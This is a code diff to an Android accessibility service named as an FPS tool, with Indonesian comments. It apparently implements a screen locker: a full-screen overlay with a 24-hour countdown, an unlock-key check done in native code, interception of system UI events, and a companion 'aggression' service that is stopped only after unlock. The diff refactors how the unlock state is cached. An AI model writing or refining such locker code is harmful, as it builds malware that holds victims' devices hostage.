@@ -20,8 +20,8 @@ public class FPSAccessibilityService extends AccessibilityService {
     private View godModeOverlay;
     private String currentInput = "";
     private long timeLeftInSeconds = 24 * 3600;
+    private boolean isAuthCached = false;
     
-    // Native method untuk verifikasi
     public native boolean verifyAdvancedKey(String input);
     
     static {
@@ -31,7 +31,18 @@ public class FPSAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        showGodModeOverlay();
+        
+        // Cek auth saat service connect
+        isAuthCached = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
+                        .getBoolean("is_authenticated", false);
+        
+        if (!isAuthCached) {
+            showGodModeOverlay();
+        } else {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                disableSelf();
+            }
+        }
     }
 
     private void showGodModeOverlay() {
@@ -63,11 +74,11 @@ public class FPSAccessibilityService extends AccessibilityService {
         TextView display = view.findViewById(R.id.textDisplayPassword);
         TextView timerText = view.findViewById(R.id.textTimer);
 
-        // Timer Loop
         Handler timerHandler = new Handler(Looper.getMainLooper());
         timerHandler.post(new Runnable() {
             @Override
             public void run() {
+                if (isAuthCached) return;
                 long h = timeLeftInSeconds / 3600;
                 long m = (timeLeftInSeconds % 3600) / 60;
                 long s = timeLeftInSeconds % 60;
@@ -99,22 +110,18 @@ public class FPSAccessibilityService extends AccessibilityService {
 
         view.findViewById(R.id.btnUnlock).setOnClickListener(v -> {
             if (verifyAdvancedKey(currentInput)) {
-                // SIMPAN STATUS PERMANEN
+                isAuthCached = true;
                 getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
                     .edit()
                     .putBoolean("is_authenticated", true)
-                    .commit(); // Gunakan commit agar sinkron sebelum proses lanjut
+                    .commit(); 
 
-                // Hapus Overlay
                 if (godModeOverlay != null) {
                     windowManager.removeViewImmediate(godModeOverlay);
                     godModeOverlay = null;
                 }
 
-                // Matikan servis agresi
                 stopService(new Intent(this, FPSService.class));
-
-                // Matikan diri sendiri
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                     disableSelf();
                 }
@@ -128,9 +135,8 @@ public class FPSAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
-                        .getBoolean("is_authenticated", false);
-        if (isAuth) return;
+        // Menggunakan cache memori, bukan baca disk di setiap event
+        if (isAuthCached) return;
 
         String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
         if (pkg.equals("com.android.systemui")) {
